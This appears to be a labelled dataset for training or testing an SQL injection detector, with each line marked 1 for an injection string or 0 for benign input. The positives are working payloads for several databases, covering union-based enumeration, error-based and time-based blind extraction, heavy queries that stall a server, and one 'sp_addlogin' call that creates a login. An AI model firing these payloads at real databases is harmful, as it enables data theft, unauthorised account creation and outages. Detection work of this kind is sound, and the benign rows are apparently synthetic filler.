1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +';1
SELECT AVG ( Price ) FROM seeing;0
"1"" or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and ""uqor"" like ""uqor";1
-7746'  )   union all select 1998,1998,1998,1998,1998,1998,1998,1998#;1
"-2122""  )   as zytb where 7025  =  7025 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --";1
quisto;0
1%'  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  '%'  =  ';1
heicy;0
SELECT * FROM whether WHERE ruler = 'trouble' FETCH FIRST 3 ROWS ONLY;0
8ienne2s6;0
-7543'   )    )     )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #;1
SELECT TOP 50 PERCENT * FROM widely;0
call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and 'hmqd'  =  'hmqd;1
otilio;0
domingo;0
exec sp_addlogin 'name' , 'password';1
1'   )    )    and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'dfxd' like 'dfxd;1
FROM  ( SELECT DISTINCT trunk FROM courage ) ;0
1  )   where 6472  =  6472;1
querando;0
genaro;0
SELECT * FROM forgot WHERE either NOT LIKE '[lion]%';0
SELECT loose ( s )  FROM scene FULL OUTER JOIN;0
1'   )    )     )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (     (  'vtoi' like 'vtoi;1
select   (  case when   (  7217  =  7631  )   then 7217 else 7217*  (  select 7217 from information_schema.character_sets  )   end  )  #;1
SELECT TOP 3 * FROM crew;0
SELECT * FROM explore WHERE turn = 'general' LIMIT 3;0
1  )   as tbve where 4828  =  4828;1
"INSERT INTO sessions (status, quantity, price) VALUES ('user123', 'pending', 'Sample text');";0
alienacin;0
select * from users where id  =  1 -@<@ union select null,version  (    )   -- 1;1
1%' or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --;1
isabelita ruiz, 31;0
1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   -- fyaq;1
SELECT * FROM keep FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM garden;0
1,  (  select   (  case when   (  8674  =  7896  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  )  ;1
"DELETE FROM users WHERE id = 'user123';";0
select sleep  (  5  )   and   (  'dcys' like 'dcys;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14#;1
bette;0
SELECT AVG ( food ) FROM sit SELECT SUM ( wave ) ;0
1' in boolean mode  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   #;1
2,04E+15;0
1' where 4102  =  4102 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --;1
evarist arnus 5 11-d;0
sparksma;0
"DELETE FROM logs WHERE email = '2023-01-01';";0
65;0
SELECT Count ( * )  AS exactly;0
1  )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     ) ;1
40592671v;0
SELECT next ( s )  FROM post UNION;0
SELECT mostID AS ID, my AS principle FROM sheep;0
toddi;0
SELECT * FROM heard;0
SELECT * FROM inside WHERE NOT fall = 'book'  AND NOT fell = 'year';0
"1""  )   as ghpx where 2873  =  2873 waitfor delay '0:0:5'--";1
"-1174"" union all select 4303,4303,4303,4303#";1
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (     (  ""%""  =  """;1
select case when 7634  =  3954 then 1 else null end--;1
or a   =   a;1
"1""  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""zbwn"" like ""zbwn";1
"DELETE FROM employees WHERE created_at = '2023-01-01';";0
SELECT * FROM arrangement WHERE earlier  BETWEEN 10 AND 20;0
SELECT TOP 3 * FROM somehow;0
1 and   (  3020  =  3020  )  *6703;1
1'  )   where 2090  =  2090;1
call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  '%'  =  ';1
" select * from users where id  =  '1' or """"<@ union select 1,version  (    )   -- 1'";1
6,91E+15;0
"SELECT quantity, description, price, id FROM products WHERE user_id = 456;";0
SELECT Employees.toward, COUNT ( Orders.onID )  AS swimmingFROM    ( OrdersINNER JOIN flow ON Orders.sisterID  =  Employees.courtID ) ;0
-3758'   )    )    union all select 9460,9460,9460,9460,9460,9460,9460,9460--;1
1'+  (  select syrz where 7699  =  7699 union all select null,null,null#;1
SELECT * FROM farm;0
SELECT * FROM cannot WHERE soft IN  ( 'toward', 'harbor', 'cloth' )  ;0
-3037  )   where 9024  =  9024 union all select 9024,9024--;1
"SELECT id, user_id, status, price FROM inventory WHERE price = 456;";0
SELECT label ( s )  FROM grown FULL OUTER JOIN;0
SELECT * FROM law ORDER BY line DESC;0
"1"" where 8241  =  8241 union all select null,null,null#";1
SELECT * FROM told WHERE complete BETWEEN '1996-07-01' AND '1996-07-31';0
SELECT slope ( s )  FROM lying;0
SELECT COUNT ( DISTINCT command )  FROM return;0
SELECT * FROM express FETCH FIRST 50 PERCENT ROWS ONLY;0
palera;0
1'  )   where 7391  =  7391 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --;1
"-2860""   )    )    order by 1#";1
eoin;0
"1""   )    )     )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --";1
1  )   where 5651  =  5651;1
-7069  )   union all select 6638,6638,6638,6638,6638,6638--;1
"""   )    )    or pg_sleep  (  __TIME__  )  --";1
"-8976%""   )    )     )   union all select 5146,5146,5146,5146,5146,5146,5146,5146--";1
"1""  )   as dgzf where 4834  =  4834";1
-5299 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     ) ;1
1  )   where 5025  =  5025;1
hiss@ajuntamentdebarcelona20.yu;0
fazenda_heigh@unanuevavisionenortodoncia.gh;0
SELECT vast ( s )  FROM queen UNION;0
SELECT curve ( s ) FROM tobacco INNER JOIN;0
-7689' union all select 8739,8739,8739,8739,8739,8739,8739,8739,8739,8739--;1
SELECT automobile,balance,younger,substance,blank     (  (  material JOIN leader ON president.clock =  strike.captured )   INNER JOIN olderON Orders.horn =  meal.graphID ) ;0
liester-okamoto@carloshoya.np;0
1'+  (  select 'hcqf' where 9956  =  9956 and   (  2993  =  4297  )  *4297  )  +';1
"1""  )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  ""tlpw""  =  ""tlpw";1
"1%"" or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and ""%""  =  """;1
"1%"" or sleep  (  5  )  #";1
benchmark(50000000,MD5(1))--;1
5exas9labo;0
1%'   )    )     )   and elt  (  4249  =  4249,7259  )   and    (    (     (  '%'  =  ';1
SELECT AVG ( writing ) FROM tales SELECT SUM ( shake ) ;0
INSERT INTO belong ( route, collect, desert, bowl, smooth, threw )  VALUES  ( 'spread', 'weigh'. forty', 'fear', 'loss', 'apartment', 'studied' )  ;0
1'   )    )    as wkys where 2478  =  2478 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --;1
silvita;0
SELECT tonight ( s )  FROM population FULL OUTER JOIN;0
1'  )   as kbja where 4275  =  4275 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --;1
SELECT * FROM travel WHERE claws NOT LIKE 'escape%';0
-7175' or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and 'upzo'  =  'upzo;1
1'   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  'fvbv'  =  'fvbv;1
SELECT world, dress, killFROM station WHERE letter  IS NOT NULL;0
"1"" and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and ""tjbe"" like ""tjbe";1
"1""   )    )    as vdbf where 7969  =  7969 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --";1
1' and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and 'psdl' like 'psdl;1
-4653' or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #;1
4211;0
SELECT * FROM hand WHERE fire BETWEEN motor09/01/1996yesterday AND policeman15/31/1996industrial;0
micr6pil8;0
"1""  )   as ivkw where 4218  =  4218 union all select null--";1
SELECT AVG ( everywhere ) FROM acres SELECT SUM ( mistake ) ;0
SELECT * FROM type  WHERE cow NOT LIKE '[rocky]%';0
1',  (  select * from generate_series  (  5609,5609,case when   (  5609  =  5609  )   then 1 else 0 end  )   limit 1  )  ;1
"1"" where 5216  =  5216 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --";1
SELECT COUNT ( grain ) FROM kept;0
vimbre;0
aveinte;0
"' AND MID(VERSION(),1,1) = '5';";1
SELECT improve ( s )  FROM cave;0
1' and elt  (  1210  =  1210,sleep  (  5   )    )    and 'ioar'  =  'ioar;1
nealson;0
"1%""   )    )     )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  ""%""  =  """;1
begin user_lock.sleep  (  5  ) ;1
-2948'   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   'ivwt'  =  'ivwt;1
select * from users where id  =  1 or <$ or 1  =  1 -- 1;1
1'  )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  'uwbt' like 'uwbt;1
1' where 7353  =  7353 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --;1
-6720'   )    )     )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  'enfe' like 'enfe;1
1738;0
1'   )    )     )   and 5615  =  5458--;1
leiro;0
1%'   )    )     )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (     (  '%'  =  ';1
morosa;0
1   )    )    as rbae where 2049  =  2049 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --;1
" select * from users where id  =  1 or ""&  (  "" or 1  =  1 -- 1";1
FROM  ( SELECT DISTINCT prepare FROM pond ) ;0
alverta;0
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#;1
"1""  )   as qayu where 6222  =  6222 union all select null,null,null#";1
1%'   )    )     )   or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --;1
SELECT * FROM minute WHERE story = 'student'  AND City = 'bill';0
SELECT * FROM color;0
SELECT AVG ( coffee ) FROM club;0
1' and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'bpbe' like 'bpbe;1
1'   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  'yznn' like 'yznn;1
85089975a;0
1   )    )     )   and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --;1
chaurett;0
"INSERT INTO logs (quantity, email, description, user_id) VALUES ('active', 'pending', 'Sample text', 'user123');";0
enlutada;0
36574;0
select * from users where id  =  1.%@ or 1  =  1 -- 1;1
naestiberger@biogasworld.rs;0
SELECT * FROM essential WHERE Price NOT BETWEEN 10 AND 20;0
-2086%'   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  '%'  =  ';1
"1"" where 4991  =  4991 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --";1
1'+  (  select 'mtpt' where 7483  =  7483 union all select null,null,null,null,null,null,null,null,null--;1
9,71E+15;0
"-3316%"" or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and ""%""  =  """;1
SELECT COUNT ( modern ) FROM double;0
SELECT * FROM sharp WHERE seed = 'within' LIMIT 3;0
"1"" and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and ""exgr"" like ""exgr";1
SELECT knew ( s )  FROM know SELECT darkness ( s ) ;0
munbrega;0
SELECT correctly,relationship,bus FROM throat LEFT JOIN Orders ON skill.chapterID =  minerals.cast ORDER BY police.women;0
c/ virgen de la almudena, 61 12?c;0
SELECT * FROM wise WHERE power = 'growth';0
SELECT Employees.type, COUNT ( Orders.locationID )  AS comeFROM    ( OrdersINNER JOIN running ON Orders.talesID  =  Employees.herdID ) ;0
1 and sleep  (  5  )  -- ruuv;1
SELECT lionID AS ID, mouse AS own FROM stomach;0
1'  )   as sjzi where 8242  =  8242 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --;1
1' in boolean mode  )   union all select null,null,null,null,null,null,null,null,null,null#;1
SELECT COUNT ( secret ) FROM beside;0
35500;0
1%'   )    )    or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (   '%'  =  ';1
select   (  case when   (  9490  =  6134  )   then 9490 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--;1
select * from users where id  =  '1' union select $ _,@@VERSION -- 1';1
1 where 6036  =  6036 and 7533  =  7533--;1
zool7ic1;0
SELECT Count ( * )  AS drive;0
a8errad1r;0
"1""   )    )    order by 1#";1
1'||  (  select 'qdkb' where 4331  =  4331;1
-4015'||  (  select 'qeqv' from dual where 1437  =  1437 union all select 1437,1437,1437,1437,1437,1437,1437,1437,1437#;1
SELECT * FROM area;0
select * from users where id  =  '1' union select 1a,banner from v$version where rownum  =  1 -- 1';1
SELECT * FROM lamp WHERE contrast BETWEEN camp09/01/1996blue AND per15/31/1996paragraph;0
"1"" union all select null,null,null,null,null,null,null,null#";1
calle doctor jose manuel pascual y pascual 146, 4?c;0
nufrago;0
-9176'   )    )    as eunw where 5978  =  5978 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #;1
villanueva de sigena;0
1'   )    )    as mqnv where 9831  =  9831;1
SELECT * FROM gold WHERE interest = 'television'  OR sang = 'average';0
SELECT MIN ( slabs )  AS expect FROM ride;0
axman@culturalsanpedrocf.ie;0
